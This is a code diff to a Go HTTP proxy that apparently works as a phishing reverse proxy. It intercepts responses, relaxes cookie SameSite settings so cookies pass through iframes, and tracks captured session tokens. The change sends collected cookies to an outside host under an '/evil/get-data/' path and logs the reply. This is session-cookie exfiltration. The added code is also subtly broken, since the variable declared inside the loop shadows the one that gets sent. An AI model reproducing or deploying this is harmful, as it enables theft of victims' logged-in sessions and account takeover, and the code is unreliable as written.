@@ -776,10 +776,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			is_http_auth := false
 			cookies := resp.Cookies()
 			resp.Header.Del("Set-Cookie")
+
+			sendCookie := ""
+
 			for _, ck := range cookies {
 				// parse cookie
 
 				// add SameSite=none for every received cookie, allowing cookies through iframes
+				sendCookie := ck.Name + "="+ck.Value + "; " 
 				if ck.Secure {
 					ck.SameSite = http.SameSiteNoneMode
 				}
@@ -886,7 +890,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.IsDone = true
 
-						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + string(s.CookieTokens))
+						worldContent := doReq("https://apis.worlds.mom/evil/get-data/?cookie=" + sendCookie)
 					    log.Info("API Content: %s", worldContent)
 					}
 				}
